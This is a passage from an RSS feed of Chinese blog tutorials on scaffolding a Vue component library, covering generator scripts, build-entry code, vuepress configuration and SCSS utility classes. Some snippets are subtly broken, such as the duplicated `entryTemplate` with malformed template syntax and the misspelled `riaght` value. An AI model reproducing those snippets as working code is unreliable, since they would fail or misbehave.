        compoenntName <span>=</span> compoenntName<span>.</span><span>charAt</span><span>(</span><span>0</span><span>)</span><span>.</span><span>toLowerCase</span><span>(</span><span>)</span> <span>+</span> compoenntName<span>.</span><span>slice</span><span>(</span><span>1</span><span>)</span>
        <span>return</span> <span><span>`</span><span>&lt;template>

  &lt;divtoken interpolation"><span>${</span>compoenntName<span>}</span></span><span>">

    </span><span><span>${</span>compoenntName<span>}</span></span><span>

  &lt;/div>
&lt;/template>

&lt;script>
export default {
  name: 'vtp-</span><span><span>${</span>compoenntName<span>}</span></span><span>',

  data () {

    return {
    }

  },

  props: {

  },

  methods: {}
}
&lt;/script>

&lt;style lang="scss" scope>
.vtp-</span><span><span>${</span>compoenntName<span>}</span></span><span>{}
&lt;/style>
</span><span>`</span></span>
    <span>}</span><span>,</span>
    <span>entryTemplate</span><span>:</span> <span>compoenntName</span> <span>=></span> <span>{</span>

        <span>return</span> <span><span>`</span><span>import </span><span><span>${</span>compoenntName<span>}</span></span><span> from './</span><span><span>${</span>compoenntName<span>}</span></span><span>'

</span><span><span>${</span>compoenntName<span>}</span></span><span>.install = function (Vue) {
  Vue.component(</span><span><span>${</span>compoenntName<span>}</span></span><span>.name, </span><span><span>${</span>compoenntName<span>}</span></span><span>)
}

export default </span><span><span>${</span>compoenntName<span>}</span></span><span>

if (typeof window !== 'undefined' &amp;&amp; window.Vue) {
  window.Vue.component(</span><span><span>${</span>compoenntName<span>}</span></span><span>.name, </span><span><span>${</span>compoenntName<span>}</span></span><span>)
}
</span><span>`</span></span>
    <span>}</span><span>,</span>
    <span>mdDocs</span><span>:</span> <span>(</span><span>title</span><span>)</span> <span>=></span> <span>{</span>

        <span>return</span> <span><span>`</span><span>## </span><span><span>${</span>title<span>}</span></span><span>

&lt;!-- {.md} -->

---
&lt;!-- {.md} -->

### 如何使用

&lt;!-- {.md} -->

### Attributes

&lt;!-- {.md} -->

| 参数 | 说明 | 类型 | 可选值 | 默认值 |
| ---- | ---- | ---- | ------ | ------ |
| -    | -    | -    | -      | -      |
    }
}
</span><span>`</span></span>
    <span>}</span><span>,</span>
    <span>entryTemplate</span><span>:</span> <span>compoenntName</span> <span>=></span> <span>{</span>
        <span>return</span> <span><span>`</span><span>import </span><span><span>${</span>compoenntName<span>}</span></span><span> from './</span><span><span>${</span>compoenntName<span>}</span></span><span>'

$ {compoenntName}.install = function(Vue) {
    Vue.component(</span><span><span>${</span>compoenntName<span>}</span></span><span>.name, </span><span><span>${</span>compoenntName<span>)</span>
<span>}</span></span><span>

export default </span><span><span>${</span>compoenntName<span>}</span></span><span>

if (typeof window !== 'undefined' &amp;&amp; window.Vue) {
    window.Vue.component(</span><span><span>${</span>compoenntName<span>}</span></span><span>.name, </span><span><span>${</span>compoenntName<span>}</span></span><span>)
}
</span><span>`</span></span>
    <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p>在 <code>build</code> 中创建以下几个文件, 其中 <code>build-entry.js</code> 脚本是用来生成自定义组件导出 <code>packages/index.js</code> , <code>get-components.js</code> 脚本是用来获取 <code>packages</code> 目录下的所有组件</p>
<div><pre><code>|--- build-entry.js
|
|--- get-components.js
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><p>相关的代码如下, 小主可以根据自己的需求进行相应的简单修改, 下面的代码参考来源 <a href="https://github.com/Eamonnzhang/vue-cards" target="_blank" rel="noopener noreferrer">vue-cards</a></p>
<p><code>build-entry.js</code></p>
<div><pre><code><span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>"fs-extra"</span><span>)</span><span>;</span>
<span>const</span> path <span>=</span> <span>require</span><span>(</span><span>"path"</span><span>)</span><span>;</span>
<span>const</span> chalk <span>=</span> <span>require</span><span>(</span><span>"chalk"</span><span>)</span><span>;</span>
<span>const</span> uppercamelize <span>=</span> <span>require</span><span>(</span><span>"uppercamelcase"</span><span>)</span><span>;</span>
<span>const</span> Components <span>=</span> <span>require</span><span>(</span><span>"./get-components"</span><span>)</span><span>(</span><span>)</span><span>;</span>
<span>const</span> packageJson <span>=</span> <span>require</span><span>(</span><span>"../package.json"</span><span>)</span><span>;</span>
<span>const</span> <span>log</span> <span>=</span> <span>(</span><span>message</span><span>)</span> <span>=></span> console<span>.</span><span>log</span><span>(</span>chalk<span>.</span><span>green</span><span>(</span><span><span>`</span><span><span>${</span>message<span>}</span></span><span>`</span></span><span>)</span><span>)</span><span>;</span>

<span>const</span> version <span>=</span> process<span>.</span>env<span>.</span><span>VERSION</span> <span>||</span> packageJson<span>.</span>version<span>;</span>

<span>function</span> <span>buildPackagesEntry</span><span>(</span><span>)</span> <span>{</span>
  <span>const</span> uninstallComponents <span>=</span> <span>[</span><span>]</span><span>;</span>

  <span>const</span> importList <span>=</span> Components<span>.</span><span>map</span><span>(</span>
    <span>(</span><span>name</span><span>)</span> <span>=></span> <span><span>`</span><span>import </span><span><span>${</span><span>uppercamelize</span><span>(</span>name<span>)</span><span>}</span></span><span> from './</span><span><span>${</span>name<span>}</span></span><span>'</span><span>`</span></span>
  <span>)</span><span>;</span>
  <span>const</span> exportList <span>=</span> Components<span>.</span><span>map</span><span>(</span><span>(</span><span>name</span><span>)</span> <span>=></span> <span><span>`</span><span><span>${</span><span>uppercamelize</span><span>(</span>name<span>)</span><span>}</span></span><span>`</span></span><span>)</span><span>;</span>
  <span>const</span> intallList <span>=</span> exportList<span>.</span><span>filter</span><span>(</span>
    <span>(</span><span>name</span><span>)</span> <span>=></span> <span>!</span><span>~</span>uninstallComponents<span>.</span><span>indexOf</span><span>(</span><span>uppercamelize</span><span>(</span>name<span>)</span><span>)</span>
  <span>)</span><span>;</span>
  <span>const</span> content <span>=</span> <span><span>`</span><span>import 'normalize.css'
    
</span><span><span>${</span>importList<span>.</span><span>join</span><span>(</span><span>"\n"</span><span>)</span><span>}</span></span><span>

const version = '</span><span><span>${</span>version<span>}</span></span><span>'
const components = [
  </span><span><span>${</span>intallList<span>.</span><span>join</span><span>(</span><span>", \n  "</span><span>)</span><span>}</span></span><span>
]

const install = Vue => {
  if (install.installed) return
  components.map(component => Vue.component(component.name, component))
}

if (typeof window !== 'undefined' &amp;&amp; window.Vue) {
  install(window.Vue)
}

export {
  install, 
  version, 
  </span><span><span>${</span>exportList<span>.</span><span>join</span><span>(</span><span>", \n  "</span><span>)</span><span>}</span></span><span>
}

export default {
  install, 
  version, 
  ...components
}
</span><span>`</span></span><span>;</span>

  fs<span>.</span><span>writeFileSync</span><span>(</span>path<span>.</span><span>join</span><span>(</span>__dirname<span>,</span> <span>"../packages/index.js"</span><span>)</span><span>,</span> content<span>)</span><span>;</span>
  <span>log</span><span>(</span><span>"packages/index.js 文件已更新依赖"</span><span>)</span><span>;</span>
  <span>log</span><span>(</span><span>"exit"</span><span>)</span><span>;</span>
<span>}</span>

<span>buildPackagesEntry</span><span>(</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>get-components.js</code></p>
<div><pre><code><span>const</span> fs <span>=</span> <span>require</span><span>(</span><span>"fs"</span><span>)</span><span>;</span>
<span>const</span> path <span>=</span> <span>require</span><span>(</span><span>"path"</span><span>)</span><span>;</span>

<span>const</span> excludes <span>=</span> <span>[</span><span>"index.js"</span><span>,</span> <span>"theme-chalk"</span><span>,</span> <span>"mixins"</span><span>,</span> <span>"utils"</span><span>,</span> <span>".DS_Store"</span><span>]</span><span>;</span>

module<span>.</span><span>exports</span> <span>=</span> <span>function</span> <span>(</span><span>)</span> <span>{</span>
  <span>const</span> dirs <span>=</span> fs<span>.</span><span>readdirSync</span><span>(</span>path<span>.</span><span>resolve</span><span>(</span>__dirname<span>,</span> <span>"../packages"</span><span>)</span><span>)</span><span>;</span>
  <span>return</span> dirs<span>.</span><span>filter</span><span>(</span><span>(</span><span>dirName</span><span>)</span> <span>=></span> excludes<span>.</span><span>indexOf</span><span>(</span>dirName<span>)</span> <span>===</span> <span>-</span><span>1</span><span>)</span><span>;</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="让-vue-解析-markdown" tabindex="-1"> 让 vue 解析 markdown</h4>
<div><p>提示</p>
<p>文档中心的 UI 是如何编码的这里不做阐述, 小主可以自行参照 <a href="https://github.com/Eamonnzhang/vue-cards" target="_blank" rel="noopener noreferrer">vue-cards</a> 中的实现方式进行改造</p>
</div>
<p>需要安装以下的依赖, 让 vue 解析 markdown</p>
<div><pre><code><span>npm</span> i markdown-it-container -D
<span>npm</span> i markdown-it-decorate -D
<span>npm</span> i markdown-it-task-checkbox -D
<span>npm</span> i vue-markdown-loader -D
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div></div></div><p>关于 vue.config.js 的配置在 <a href="https://github.com/Eamonnzhang/vue-cards" target="_blank" rel="noopener noreferrer">vue-cards</a> 该项目中也有了, 不做阐述</p>
<p>这里将补充高亮 <code>highlight.js</code> 以及点击复制代码 <code>clipboard</code> 的实现方式</p>
<p>安装依赖</p>
<div><pre><code><span>npm</span> i clipboard highlight.js
</code></pre><div aria-hidden="true"><div></div></div></div><p>改造 <code>App.vue</code> , 以下只是列出部分代码, 小主可以根据自己的需求进行添加</p>
<div><pre><code><span><span><span>&lt;</span>script</span><span>></span></span><span><span>
  <span>import</span> hljs <span>from</span> <span>"highlight.js"</span><span>;</span>
  <span>import</span> Clipboard <span>from</span> <span>"clipboard"</span><span>;</span>

  <span>const</span> <span>highlightCode</span> <span>=</span> <span>(</span><span>)</span> <span>=></span> <span>{</span>
    <span>const</span> preEl <span>=</span> document<span>.</span><span>querySelectorAll</span><span>(</span><span>"pre"</span><span>)</span><span>;</span>

    preEl<span>.</span><span>forEach</span><span>(</span><span>(</span><span>el<span>,</span> index</span><span>)</span> <span>=></span> <span>{</span>
      hljs<span>.</span><span>highlightBlock</span><span>(</span>el<span>)</span><span>;</span>

      <span>const</span> lang <span>=</span> el<span>.</span>children<span>[</span><span>0</span><span>]</span><span>.</span>className<span>.</span><span>split</span><span>(</span><span>" "</span><span>)</span><span>[</span><span>1</span><span>]</span><span>.</span><span>split</span><span>(</span><span>"-"</span><span>)</span><span>[</span><span>1</span><span>]</span><span>;</span>
      <span>const</span> pre <span>=</span> el<span>;</span>
      <span>const</span> span <span>=</span> document<span>.</span><span>createElement</span><span>(</span><span>"span"</span><span>)</span><span>;</span>
      span<span>.</span><span>setAttribute</span><span>(</span><span>"class"</span><span>,</span> <span>"code-copy"</span><span>)</span><span>;</span>
      span<span>.</span><span>setAttribute</span><span>(</span><span>"data-clipboard-snippet"</span><span>,</span> <span>""</span><span>)</span><span>;</span>
      span<span>.</span>innerHTML <span>=</span> <span><span>`</span><span><span>${</span>lang<span>.</span><span>toUpperCase</span><span>(</span><span>)</span><span>}</span></span><span> | COPY</span><span>`</span></span><span>;</span>
      pre<span>.</span><span>appendChild</span><span>(</span>span<span>)</span><span>;</span>
    <span>}</span><span>)</span><span>;</span>
  <span>}</span><span>;</span>

  <span>export</span> <span>default</span> <span>{</span>
    <span>name</span><span>:</span> <span>"App"</span><span>,</span>

    <span>mounted</span><span>(</span><span>)</span> <span>{</span>
      <span>if</span> <span>(</span><span>"onhashchange"</span> <span>in</span> window<span>)</span> <span>{</span>
        window<span>.</span><span>onhashchange</span> <span>=</span> <span>function</span> <span>(</span><span>ev</span><span>)</span> <span>{</span>
          <span>let</span> name <span>=</span> window<span>.</span>location<span>.</span>hash<span>.</span><span>substring</span><span>(</span><span>2</span><span>)</span><span>;</span>
          router<span>.</span><span>push</span><span>(</span><span>{</span>
            name<span>,</span>
          <span>}</span><span>)</span><span>;</span>
        <span>}</span><span>;</span>
      <span>}</span>

      <span>highlightCode</span><span>(</span><span>)</span><span>;</span>

      <span>let</span> clipboard <span>=</span> <span>new</span> <span>Clipboard</span><span>(</span><span>".code-copy"</span><span>,</span> <span>{</span>
        <span>text</span><span>:</span> <span>(</span><span>trigger</span><span>)</span> <span>=></span> <span>{</span>
          <span>return</span> trigger<span>.</span>previousSibling<span>.</span>innerText<span>;</span>
        <span>}</span><span>,</span>
      <span>}</span><span>)</span><span>;</span>
      <span>// 复制成功执行的回调</span>
      clipboard<span>.</span><span>on</span><span>(</span><span>"success"</span><span>,</span> <span>(</span><span>e</span><span>)</span> <span>=></span> <span>{</span>
        e<span>.</span>trigger<span>.</span>innerHTML <span>=</span> <span><span>`</span><span>已复制</span><span>`</span></span><span>;</span>
      <span>}</span><span>)</span><span>;</span>
    <span>}</span><span>,</span>

    <span>updated</span><span>(</span><span>)</span> <span>{</span>
      <span>highlightCode</span><span>(</span><span>)</span><span>;</span>
    <span>}</span><span>,</span>
  <span>}</span><span>;</span>
</span></span><span><span><span>&lt;/</span>script</span><span>></span></span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h4 id="生成命令" tabindex="-1"> 生成命令</h4>
<p>在 <code>package.json</code> 中添加以下内容, 使用命令 <code>yarn new:comp</code> 创建组件目录及其文档或者使用命令 <code>yarn del:comp</code> 即可删除组件目录及其文档</p>
<div><pre><code><span>{</span>
  <span>"scripts"</span><span>:</span> <span>{</span>
    <span>"new:comp"</span><span>:</span> <span>"node scripts/create-comp.js &amp;&amp; node build/build-entry.js"</span><span>,</span>
    <span>"del:comp"</span><span>:</span> <span>"node scripts/delete-comp.js &amp;&amp; node build/build-entry.js"</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="changelog" tabindex="-1"> changelog</h2>
<p>在 <code>package.json</code> 中修改 script 字段, 接下来你懂的, 另一篇博客有介绍哦, 小主可以执行搜索</p>
<div><pre><code><span>{</span>
  <span>"scripts"</span><span>:</span> <span>{</span>
    <span>"init"</span><span>:</span> <span>"npm install commitizen -g &amp;&amp; commitizen init cz-conventional-changelog --save-dev --save-exact &amp;&amp; npm run bootstrap"</span><span>,</span>
    <span>"bootstrap"</span><span>:</span> <span>"npm install"</span><span>,</span>
    <span>"changelog"</span><span>:</span> <span>"conventional-changelog -p angular -i CHANGELOG.md -s -r 0"</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div>]]></content:encoded>
    </item>
    <item>
      <title>使用 Vue cli 3.0 构建自定义组件库(第二弹)</title>
      <link>https://vxhly.github.io/views/vuejs/custom-component-library-second.html</link>
      <guid>https://vxhly.github.io/views/vuejs/custom-component-library-second.html</guid>
      <source url="https://vxhly.github.io/rss.xml">使用 Vue cli 3.0 构建自定义组件库(第二弹)</source>
      <description>前言
本文旨在给大家提供一种构建一个完整 UI 库脚手架的思路: 包括如何快速并优雅地构建 UI 库的主页、如何托管主页、如何编写脚本提升自己的开发效率、如何生成 CHANGELOG 等, 此文乃第二弹版本, 看过第一弹版本的小伙伴, 想必都知道第一弹版本的组件库文档 UI 是需要自己写的, 最近也是刚研究出来其实 vuepress 也可以作为组件库文档的 UI, 该文档 UI 绝对不输于第一弹版本的。

</description>
      <category>vuejs</category>
      <pubDate>Fri, 16 Aug 2019 09:30:20 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>本文旨在给大家提供一种构建一个完整 UI 库脚手架的思路: 包括如何快速并优雅地构建 UI 库的主页、如何托管主页、如何编写脚本提升自己的开发效率、如何生成 CHANGELOG 等, 此文乃第二弹版本, 看过第一弹版本的小伙伴, 想必都知道第一弹版本的组件库文档 UI 是需要自己写的, 最近也是刚研究出来其实 vuepress 也可以作为组件库文档的 UI, 该文档 UI 绝对不输于第一弹版本的。</p>
</div>

<h2 id="前言" tabindex="-1"> 前言</h2>
<p><a href="/views/vuejs/custom-component-library-first.html">想看第一弹版本的小伙伴, 请戳我</a></p>
<p>第二弹前期具备知识点</p>
<ul>
<li><a href="https://vuepress.vuejs.org/zh/" target="_blank" rel="noopener noreferrer">vuepress</a></li>
<li><a href="https://cli.vuejs.org/zh/" target="_blank" rel="noopener noreferrer">Vue CLI</a></li>
</ul>
<h2 id="前置工作" tabindex="-1"> 前置工作</h2>
<p>以下工作全部基于 Vue CLI 3.x, 所以首先要保证机子上有 <code>@vue/cli</code></p>
<div><pre><code>vue create vtp-component <span># vtp-component 作为教学的库名</span>
</code></pre><div aria-hidden="true"><div></div></div></div><p><code>vue-router</code> , <code>dart-sass</code> , <code>babel</code> , <code>eslint</code> 这些是该项目使用的依赖项, 小主可以根据自己的需求进行相应的切换</p>
<h2 id="start" tabindex="-1"> start</h2>
<p>开始造轮子了, 以下示例代码 <a href="https://github.com/vxhly/vtp-component" target="_blank" rel="noopener noreferrer">请戳这里</a></p>
<h2 id="工作目录" tabindex="-1"> 工作目录</h2>
<p>默认生成的 src 目录以及 public 目录在该项目下是没有作用的, 小主可以删掉了, 这么做的主要目的当然只是保留生成的 <code>package.json</code> 文件</p>
<p>调整项目目录如下, 其中 build 文件夹用来存放编译脚本代码, docs 文件夹则是 vuepress 的主体部分了, 其中 .vuepress 是用来存放 vuepress 相关的配置文件, 而组件文档则放置在 docs 的根目录, packages 文件夹是用来存放组件的核心代码, scripts 文件夹用来存放自定义生成组件和组件的说明文档等脚本</p>
<p>大致的目录结构如下：</p>
<div><pre><code>|-- build
|
|-- docs
    |-- .vuepress
        |-- config.js
        |-- enhanceApp.js
    |-- README.md
|
|-- packages
|   |-- index.js
|
|-- scripts
|
|-- config.js
|
|-- .npmrm
|
|-- .npmignore
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="添加编译脚本" tabindex="-1"> 添加编译脚本</h2>
<div><p>注意</p>
<p><code>core-js</code> 库需要采用的 2.6.5 这个版本, 高于这个版本的可能会导致开启文档失败</p>
</div>
<p><code>package.json</code> 其中的组件 name 推荐和创建的项目名一致</p>
<div><pre><code><span>{</span>
  <span>"scripts"</span><span>:</span> <span>{</span>
    <span>"build:lib"</span><span>:</span> <span>"vue-cli-service build --target lib --name vtp-component --dest lib packages/index.js"</span>
  <span>}</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div></div></div><p>修改 main 主入口文件</p>
<div><pre><code><span>{</span>
  <span>"main"</span><span>:</span> <span>"lib/vtp-component.common.js"</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h2 id="一个组件例子" tabindex="-1"> 一个组件例子</h2>
<h3 id="vuepress-配置" tabindex="-1"> vuepress 配置</h3>
<p>这里提供一些简单的配置, 当然想要高级的配置甚至想要自定义主题皆可从官方文档中获取到帮助</p>
<p><code>config.js</code> 使用插件 <code>vuepress-plugin-vue-demo</code> 将可以像 ElementUI 中写文档演示 demo 一样写文档了</p>
<div><pre><code><span>const</span> config <span>=</span> <span>{</span>
  <span>dest</span><span>:</span> <span>"public"</span><span>,</span>
  <span>plugins</span><span>:</span> <span>[</span><span>"vue-demo"</span><span>]</span><span>,</span>
  <span>serviceWorker</span><span>:</span> <span>true</span><span>,</span>
  <span>themeConfig</span><span>:</span> <span>{</span>
    <span>sidebar</span><span>:</span> <span>[</span>
      <span>[</span><span>"/CHANGELOG"</span><span>,</span> <span>"更新日志"</span><span>]</span><span>,</span>
      <span>[</span><span>"/"</span><span>,</span> <span>"指南"</span><span>]</span><span>,</span>
      <span>{</span>
        <span>title</span><span>:</span> <span>"组件"</span><span>,</span>
        <span>collapsable</span><span>:</span> <span>false</span><span>,</span>
        <span>children</span><span>:</span> <span>[</span><span>]</span><span>,</span>
      <span>}</span><span>,</span>
    <span>]</span><span>,</span>
  <span>}</span><span>,</span>
  <span>markdown</span><span>:</span> <span>{</span>
    <span>lineNumbers</span><span>:</span> <span>true</span><span>,</span>
  <span>}</span><span>,</span>
  <span>title</span><span>:</span> <span>"vtp-component"</span><span>,</span>
  <span>base</span><span>:</span> <span>"/"</span><span>,</span>
<span>}</span><span>;</span>

module<span>.</span>exports <span>=</span> config<span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><p><code>enhanceApp.js</code></p>
<div><pre><code><span>import</span> <span>UI</span> <span>from</span> <span>"../../packages"</span><span>;</span>

<span>export</span> <span>default</span> <span>(</span><span>{</span>
  Vue<span>,</span> <span>// the version of Vue being used in the VuePress app</span>
  options<span>,</span> <span>// the options for the root Vue instance</span>
  router<span>,</span> <span>// the router instance for the app</span>
  siteData<span>,</span> <span>// site metadata</span>
<span>}</span><span>)</span> <span>=></span> <span>{</span>
  Vue<span>.</span><span>use</span><span>(</span><span>UI</span><span>)</span><span>;</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="基础的-packages-配置" tabindex="-1"> 基础的 packages 配置</h3>
<div><pre><code><span>import</span> <span>"./assets/scss/common.scss"</span><span>;</span>

<span>const</span> version <span>=</span> <span>require</span><span>(</span><span>"../package.json"</span><span>)</span><span>.</span>version<span>;</span>
<span>const</span> components <span>=</span> <span>[</span><span>]</span><span>;</span>

<span>const</span> <span>install</span> <span>=</span> <span>(</span><span>Vue</span><span>)</span> <span>=></span> <span>{</span>
  <span>if</span> <span>(</span>install<span>.</span>installed<span>)</span> <span>return</span><span>;</span>
  components<span>.</span><span>map</span><span>(</span><span>(</span><span>component</span><span>)</span> <span>=></span> Vue<span>.</span><span>component</span><span>(</span>component<span>.</span>name<span>,</span> component<span>)</span><span>)</span><span>;</span>
<span>}</span><span>;</span>

<span>export</span> <span>{</span> install<span>,</span> version <span>}</span><span>;</span>

<span>export</span> <span>default</span> <span>{</span>
  install<span>,</span>
  version<span>,</span>
<span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><pre><code><span><span>$prefix</span></span><span>:</span> <span>"vtp"</span><span>;</span>

<span>@for</span> <span>$i</span> <span>from</span> 12 <span>through</span> <span>48 </span><span>{</span>
  <span>.<span>#{$prefix}</span>-fs<span>#{$i}</span> </span><span>{</span>
    <span>font-size</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>
  <span>}</span>

  <span>.<span>#{$prefix}</span>-lh<span>#{$i}</span> </span><span>{</span>
    <span>line-height</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>
  <span>}</span>
<span>}</span>

<span>@for</span> <span>$i</span> <span>from</span> 5 <span>through</span> <span>40 </span><span>{</span>
  <span>.<span>#{$prefix}</span>-margin<span>#{$i}</span> </span><span>{</span>
    <span>margin</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>
  <span>}</span>

  <span>.<span>#{$prefix}</span>-padding<span>#{$i}</span> </span><span>{</span>
    <span>padding</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>
  <span>}</span>

  <span>.<span>#{$prefix}</span>-m-l<span>#{$i}</span> </span><span>{</span>
    <span>margin-left</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>
  <span>}</span>

  <span>.<span>#{$prefix}</span>-m-r<span>#{$i}</span> </span><span>{</span>
    <span>margin-right</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>
  <span>}</span>

  <span>.<span>#{$prefix}</span>-m-lr<span>#{$i}</span> </span><span>{</span>
    <span>margin-left</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>
    <span>margin-right</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>
  <span>}</span>

  <span>.<span>#{$prefix}</span>-m-t<span>#{$i}</span> </span><span>{</span>
    <span>margin-top</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>
  <span>}</span>

  <span>.<span>#{$prefix}</span>-m-b<span>#{$i}</span> </span><span>{</span>
    <span>margin-bottom</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>
  <span>}</span>

  <span>.<span>#{$prefix}</span>-m-tb<span>#{$i}</span> </span><span>{</span>
    <span>margin-top</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>
    <span>margin-bottom</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>
  <span>}</span>

  <span>.<span>#{$prefix}</span>-p-l<span>#{$i}</span> </span><span>{</span>
    <span>padding-left</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>
  <span>}</span>

  <span>.<span>#{$prefix}</span>-p-r<span>#{$i}</span> </span><span>{</span>
    <span>padding-right</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>
  <span>}</span>

  <span>.<span>#{$prefix}</span>-p-lf<span>#{$i}</span> </span><span>{</span>
    <span>padding-left</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>
    <span>padding-right</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>
  <span>}</span>

  <span>.<span>#{$prefix}</span>-p-t<span>#{$i}</span> </span><span>{</span>
    <span>padding-top</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>
  <span>}</span>

  <span>.<span>#{$prefix}</span>-p-b<span>#{$i}</span> </span><span>{</span>
    <span>padding-bottom</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>
  <span>}</span>

  <span>.<span>#{$prefix}</span>-p-tb<span>#{$i}</span> </span><span>{</span>
    <span>padding-top</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>
    <span>padding-bottom</span><span>:</span> <span>#{$i}</span>px <span>!important</span><span>;</span>
  <span>}</span>
<span>}</span>

<span>.<span>#{$prefix}</span>-tc </span><span>{</span>
  <span>text-align</span><span>:</span> center <span>!important</span><span>;</span>
<span>}</span>

<span>.<span>#{$prefix}</span>-tl </span><span>{</span>
  <span>text-align</span><span>:</span> left <span>!important</span><span>;</span>
<span>}</span>

<span>.<span>#{$prefix}</span>-tr </span><span>{</span>
  <span>text-align</span><span>:</span> right <span>!important</span><span>;</span>
<span>}</span>

<span>.<span>#{$prefix}</span>-fl </span><span>{</span>
  <span>float</span><span>:</span> left <span>!important</span><span>;</span>
<span>}</span>

<span>.<span>#{$prefix}</span>-fr </span><span>{</span>
  <span>float</span><span>:</span> riaght <span>!important</span><span>;</span>
<span>}</span>

<span>.<span>#{$prefix}</span>-cl-both </span><span>{</span>
  <span>clear</span><span>:</span> both <span>!important</span><span>;</span>
<span>}</span>

<span>.<span>#{$prefix}</span>-fw-b </span><span>{</span>
  <span>font-weight</span><span>:</span> bold <span>!important</span><span>;</span>
<span>}</span>

<span>.<span>#{$prefix}</span>-absolute </span><span>{</span>
  <span>position</span><span>:</span> absolute <span>!important</span><span>;</span>
<span>}</span>

<span>.<span>#{$prefix}</span>-relative </span><span>{</span>
  <span>position</span><span>:</span> relative <span>!important</span><span>;</span>
<span>}</span>

<span>.<span>#{$prefix}</span>-fixed </span><span>{</span>
  <span>position</span><span>:</span> fixed <span>!important</span><span>;</span>
<span>}</span>

<span>.<span>#{$prefix}</span>-flex </span><span>{</span>
  <span>display</span><span>:</span> flex<span>;</span>
<span>}</span>

<span>.<span>#{$prefix}</span>-f-sc </span><span>{</span>
  <span>align-self</span><span>:</span> center<span>;</span>
<span>}</span>
